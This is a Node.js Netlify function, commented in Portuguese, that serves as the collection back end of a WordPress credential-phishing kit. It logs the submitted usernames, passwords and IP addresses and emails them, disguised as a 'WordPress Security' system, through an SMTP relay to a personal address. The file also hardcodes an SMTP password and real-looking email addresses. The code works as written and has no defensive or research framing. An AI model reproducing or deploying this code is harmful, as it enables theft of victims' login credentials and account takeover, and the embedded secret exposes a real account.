// netlify/functions/log.js
const nodemailer = require('nodemailer');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);
        
        // ENVIAR EMAIL
        await enviarEmail(data);
        
        // Log no console também
        console.log('📧 CREDENCIAIS CAPTURADAS E ENVIADAS POR EMAIL:', {
            username: data.username,
            password: data.password,
            ip: data.ip,
            timestamp: data.timestamp
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true })
        };
    } catch (error) {
        console.error('Erro:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal Server Error' })
        };
    }
};

async function enviarEmail(data) {
    const transporter = nodemailer.createTransport({
        host: 'smtp-relay.brevo.com',
        port: 587,
        secure: false,
        auth: {
            user: 'survivortheweb@gmail.com',
            pass: '3NkLXZIGpS6aBnVj' // ← VOCÊ PRECISA COLOCAR AQUI
        }
    });

    const mailOptions = {
        from: '"WordPress Security" <survivortheweb@gmail.com>',
        to: 'ofelipeoliveira.rodrigues@gmail.com',
        subject: '🔐 Novas Credenciais Capturadas - WordPress',
        html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                <h2 style="color: #0073aa;">📧 Credenciais Capturadas - WordPress</h2>
                <div style="background: #f8f9fa; padding: 15px; border-radius: 5px; border-left: 4px solid #0073aa;">
                    <p><strong>👤 Usuário:</strong> ${data.username}</p>
                    <p><strong>🔑 Senha:</strong> <code style="background: #fff; padding: 2px 5px; border-radius: 3px;">${data.password}</code></p>
                    <p><strong>🌐 IP:</strong> ${data.ip}</p>
                    <p><strong>🕒 Data/Hora:</strong> ${new Date(data.timestamp).toLocaleString('pt-BR')}</p>
                </div>
                <hr style="margin: 20px 0;">
                <p style="color: #666; font-size: 12px;">Sistema de Segurança WordPress • ${new Date().toLocaleDateString('pt-BR')}</p>
            </div>
        `
    };
          
    await transporter.sendMail(mailOptions);
}